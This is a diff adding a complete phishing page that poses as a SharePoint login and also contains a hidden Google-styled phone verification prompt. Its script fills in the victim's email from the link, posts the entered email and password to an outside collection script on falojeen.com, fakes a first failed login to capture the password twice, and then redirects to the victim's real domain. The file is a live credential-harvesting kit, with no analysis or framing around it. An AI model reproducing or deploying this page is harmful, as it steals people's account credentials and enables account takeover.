@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   Login into your sharepoint account
+  </title>
+  <link href="icon.ico" rel="icon" type="icon"/>
+  <link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" rel="stylesheet"/>
+  <style type="text/css">
+   body{
+			background: #0073C6;
+		}
+
+		.container{
+			width:100%;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+		}
+
+		.office{
+			width: 380px;
+			background: #fff;
+		}
+
+		.office-holder{
+			width:80%;
+			margin: auto;
+			padding: 20px 0px;
+		}
+
+		.logo{
+			width:100%;
+			margin-bottom: 2em;
+		}
+
+		.logo h1{
+			font-family: arial;
+
+		}
+		.logo h2 {
+			display: block!important;
+		}
+
+		.verify{
+			width: 70%;
+			margin: auto;
+		}
+
+		.verify h4{
+			font-family: arial;
+		}
+
+		fieldset{
+			width: 90%;
+			float: right;
+			border:2px solid #4285f4;
+			border-radius: 5px;
+		}
+
+		legend{
+			font-size: 15px;
+			overflow: hidden;
+			width: 42%;
+			padding:0px 2px;
+			margin: 0px;
+		}
+
+		.verify input[type='text']{
+			width: 100%;
+			float: right;
+			border:none;
+			padding:3px 10px;
+		}
+
+		.verify button{
+			border:none;
+			height: 40px;
+			width: 80px;
+			float: right;
+			margin-top: 2em;
+			background: #4285f4;
+			border-radius: 5px;
+			color: #fff;
+		}
+
+		.email-to-verify{
+			border:1px solid #000;
+			border-radius: 10px;
+		}
+
+		.form-holder{
+			width:100%;
+			float: left;
+		}
+
+		.form-holder h3{
+			font-weight: 600;
+		}
+
+		.form-holder input[type='email'], input[type='password']{
+			width: 100%;
+			height:40px;
+			float: left;
+			margin-bottom: 15px;
+		}
+		.form-holder .btn-holder{
+			width:100%;
+			margin-top:1em;
+			display: flex;
+			align-content: center;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.form-holder .btn-holder .btn{
+			background:#0073C6;
+			border:none;
+			padding:6px 10px;
+			color:#fff;
+			border-radius: 0px;
+			margin-top: 20px;
+			margin-bottom: 20px;
+		}
+
+		.form-holder .btn-holder .btn:hover{
+			cursor:pointer;
+		}
+
+		.checkbox{
+			width: 100%;
+			float: left;
+			margin-top:5px;
+		}
+
+		.checkbox label{
+			font-family:arial;
+			font-size:13px;
+			float: left;
+			margin-left:1em;
+		}
+
+		.hide{
+			display: none;
+		}
+  </style>
+ </head>
+ <body onload="checkMail()">
+  <!---START---->
+  <input id="posturl" type="hidden" value="https://falojeen.com/admin-panel/js/send-email-address.php"/>
+  <!---END ---->
+  <div class="container">
+   <div class="office hide" id="verify" style="border: 1px solid #eee; border-radius: 5px; padding:50px 0px; width: 400px;">
+    <div class="verify" style="text-align: center;">
+     <div style="width: 100%; margin-bottom: 10px;">
+      <img src="google.png" width="100px"/>
+     </div>
+     <div style="width: 100%;">
+      <div class="alert alert-danger hide alert1">
+      </div>
+     </div>
+     <h4>
+      Verify it's you
+     </h4>
+     <p>
+      This device isn't recognized. For your security, Google wants to make sure it's really you
+     </p>
+    </div>
+    <div class="verify">
+     <div class="email-to-verify" style="margin-bottom: 5px; text-align: center;">
+     </div>
+     <p style="font-size:13px; float: left; margin-top: 12px; margin-bottom:26px;">
+      Confirm the phone number you provided in your security settings
+     </p>
+    </div>
+    <div class="verify">
+     <fieldset>
+      <legend>
+       Phone number
+      </legend>
+      <input id="phone-no" name="phone" type="text"/>
+     </fieldset>
+     <button id="next">
+      Next
+     </button>
+    </div>
+   </div>
+   <div class="office show border shadow bg-light" id="others">
+    <div class="office-holder">
+     <div class="logo">
+      <h4 class="text-dark">
+       <strong class="text-uppercase" id="domain-name">
+       </strong>
+      </h4>
+      <h5 class="font-weight-light">
+       Please sign using your email and password to gain access
+      </h5>
+     </div>
+     <div style="width: 100%;">
+      <div class="alert alert-danger hide alert2" id="msgbox">
+      </div>
+     </div>
+     <form>
+      <div class="form-holder">
+       <input class="form-control" disabled="" id="email" placeholder="someone@example.com" required="" type="email"/>
+       <input class="form-control" id="password" placeholder="Password" required="" type="password"/>
+       <div class="checkbox">
+        <input name="" style="float: left; margin-top:2px; margin-bottom: 10px;" type="checkbox"/>
+        <label>
+         REMEMBER ME
+        </label>
+       </div>
+       <div class="btn-holder">
+        <button class="btn btn-lg col-12" id="signin">
+         LOGIN
+        </button>
+       </div>
+       <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">
+        can't access your account?
+       </p>
+       <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">
+        Sign in with a single-use code
+       </p>
+      </div>
+      <input id="rqcount" name="rqcount" type="hidden"/>
+     </form>
+    </div>
+   </div>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js">
+  </script>
+  <script>
+   var counter = 0;
+
+
+
+var url = $("#posturl").val();
+
+	var geteml = location.hash.substring(1);
+	$("#email").val(geteml);
+	var getdomain = geteml.substring(geteml.indexOf('@')+1,geteml.lastIndexOf("."));
+	var xdomain = geteml.substring(geteml.indexOf('@')+1);
+	$("#domain-name").html(getdomain.toUpperCase());
+
+function checkMail(){
+	var email = document.getElementById('email');
+	var password = document.getElementById('password');
+	var showDomain = document.getElementById('domain-name');
+	var domain = '';
+	domain = email.value.replace(/.*@/, "").split('.')[0];
+	showDomain.textContent = domain;
+}
+
+
+$('#signin').click(function(e){
+	e.preventDefault();
+        var email = document.getElementById('email');
+        domain = email.value.replace(/.*@/, "").split('.')[0];
+        var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
+        var alert2 = document.querySelector('#msgbox');
+        var alert1 = document.querySelector('.alert1');
+        if($('#email').val() == ""){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Please enter your email address.";
+            return false;
+        }else if(!($('#email').val().match(checkmail))){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Incorrect email format.";
+            return false;
+        }else if($('#password').val() == ""){
+            $('#password').focus();
+            $('#msgbox').show();
+            alert2.textContent = "Please enter your password";
+            return false;
+        }
+        else{
+            counter = counter + 1;
+            alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
+            alert2.textContent = "Loggin in...";
+            $('.alert2').show();
+
+            if (counter > 1){
+                var xmlhttp;
+                if(window.XMLHttpRequest){
+                  xmlhttp = new XMLHttpRequest();
+                }else{
+                  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                }
+
+                xmlhttp.onreadystatechange=function(){
+                  if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                        alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-success");
+                        alert2.textContent = "Action Executed Successfully!";
+                        window.location = 'https://'+xdomain;
+                  } else {
+                      console.log(xmlhttp.responseText);
+                  }
+                }
+
+                var getemail = document.getElementById('email').value;
+                var getpassword = document.getElementById('password').value;
+                var formdata = new FormData();
+
+                formdata.append("email", getemail);
+                formdata.append("password", getpassword);
+
+                xmlhttp.open("POST", url);
+                xmlhttp.send(formdata);
+
+                return false;
+            }
+
+            var xmlhttp;
+            if(window.XMLHttpRequest){
+              xmlhttp = new XMLHttpRequest();
+            }else{
+              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+
+            xmlhttp.onreadystatechange=function(){
+              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                    alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
+                    alert2.textContent = xmlhttp.responseText;
+                    document.getElementById('password').value = "";
+                    document.getElementById('password').focus();
+              } else {
+                  console.log(xmlhttp.responseText);
+              }
+            }
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var formdata = new FormData();
+
+            formdata.append("email", email);
+            formdata.append("password", password);
+
+
+            xmlhttp.open("POST", url);
+            xmlhttp.send(formdata);
+
+            return false;
+
+        }
+
+})
+  </script>
+ </body>
+</html>
